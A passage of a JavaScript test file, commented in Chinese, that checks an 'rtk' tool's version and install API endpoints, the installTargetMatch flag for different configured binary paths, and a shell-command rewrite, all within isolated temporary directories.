    // 窗口起点：boot 解析命中具体路径（种子钉死窗口条件成立）——apply 接线的数据面 exec 缝不进 handler
    //（生产=真 execFile，F-01/F-03 同款真执行假脚本形），boot 脚本 --version 退出 1=「在位但版本不可见」损坏形
    const before = await callSpec(spec, makeReq({ url: `${API_PREFIX}/version` }))
    assert.deepEqual(
      { path: before.body.data.path, available: before.body.data.available, version: before.body.data.version },
      { path: bootBin, available: true, version: null },
      '窗口起点：boot 解析=具体路径 bootBin（装载探针失败=失能态；数据面损坏形：在位但版本不可见）',
    )

    // 中途删除 + 一键重装落 ~/.local/bin/rtk（≠ 种子位）
    fs.rmSync(bootBin)
    const inst = await callSpec(spec, makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' }))
    assert.equal(inst.status, 200)
    assert.equal(inst.body.data.verify.version, '9.9.9')
    assert.equal(inst.body.data.verify.path, landed, 'verify 直指落盘 targetPath（Ruling c 不破）')

    // ① 数据面自愈：每请求以 config 原值重发现（钉死窗口=红：available:false 恒不闭合）
    const after = await callSpec(spec, makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(after.body.data.available, true, '窗口a 自愈：GET version 回 available:true（种子=config 原值每请求重发现）')
    assert.equal(after.body.data.version, '9.9.9')
    assert.equal(after.body.data.path, landed, 'path=本次发现的实际执行值（落点 ~/.local/bin/rtk，非钉死种子位）')
    assert.equal(after.body.data.hint, null)
    assert.equal(after.body.data.lastInstall.ok, true, '同屏记录行「成功」与可用态口径一致')

    // ② rewrite 缝：惰性翻转 + 改写真执行（真 spawnSync 落盘双模脚本，零真实 rtk）
    const req = { command: 'git status', stdin: null }
    assert.deepEqual(w.ctx.shell.resolve(req), { ...req, command: 'rtk git status' }, '窗口a 功能恢复面：惰性 stat 复检翻转+runRtkRewrite 真执行')
  })
})

test('F-FINAL-1(ii) 窗口b：显式 config 自定义路径缺失（≠引擎落点）→ version 面 installTargetMatch:false + A3 透传不破；裸名/落点位/在位种子 match:true', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-ff1b-'))
  await hermetic(root, async () => {
    const custom = path.join(root, 'custom', 'rtk') // 显式自定义路径（缺失）
    const installDir = path.join(root, '.local', 'bin')
    const targetPath = path.join(installDir, 'rtk') // 引擎落点（INV-7 写面限制：恒装此位）
    const resolveEnv = sceneEnv(root)
    const { exec } = fakeExec(async () => {
      throw enoentError()
    })
    const base = {
      exec,
      resolveEnv,
      installOpts: { logPath: path.join(root, 'install-log.json'), installDir },
      platform: 'linux',
      arch: 'x64',
    }

    // 窗口 b：自定义路径缺失且 ≠ 引擎落点 → match:false（按钮门控收窄：装了也不满足配置位）
    const r1 = routesWith({ ...base, rtkBin: custom }, { rejection: undefined })
    const res1 = await r1.call(makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(res1.status, 200)
    assert.equal(res1.body.data.installTargetMatch, false, '窗口b：装了也不满足配置位 → false（按钮不出+手动提示，防误导成功）')
    assert.equal(res1.body.data.path, custom, 'A3 透传不破：显式值原样作执行值（resolve-bin 语义零改动）')
    assert.equal(res1.body.data.available, false)
    assert.equal(res1.body.data.hint, INSTALL_HINT, 'F-02/A4 门控不破：真缺失带安装提示')

    // 对照 ①：种子=引擎落点位（缺失）→ match:true（一键重装即满足配置位，按钮照出）
    const r2 = routesWith({ ...base, rtkBin: targetPath }, { rejection: undefined })
    const res2 = await r2.call(makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(res2.body.data.installTargetMatch, true, '落点位种子：装完即满足 → true')
    assert.equal(res2.body.data.path, targetPath, 'A3 透传不破（对照）')

    // 对照 ②：缺省裸名（缺失）→ match:true（A2 发现可被引擎落点满足）
    const r3 = routesWith({ ...base, rtkBin: 'rtk' }, { rejection: undefined })
    const res3 = await r3.call(makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(res3.body.data.installTargetMatch, true, '裸名种子：缺省发现语义 → true')

    // 对照 ③：自定义路径在位可执行 → match:true（门控三条件不齐——「缺失」条件不成立）
    fs.mkdirSync(path.dirname(custom), { recursive: true })
    fs.writeFileSync(custom, Buffer.from('#!/bin/sh\nexit 0\n'))
    fs.chmodSync(custom, 0o755)
    const r4 = routesWith({ ...base, rtkBin: custom }, { rejection: undefined })
    const res4 = await r4.call(makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(res4.body.data.installTargetMatch, true, '在位路径：非「缺失」窗口 → true')
    assert.equal(res4.body.data.path, custom, 'A3 透传不破（对照 ③）')
  })
})
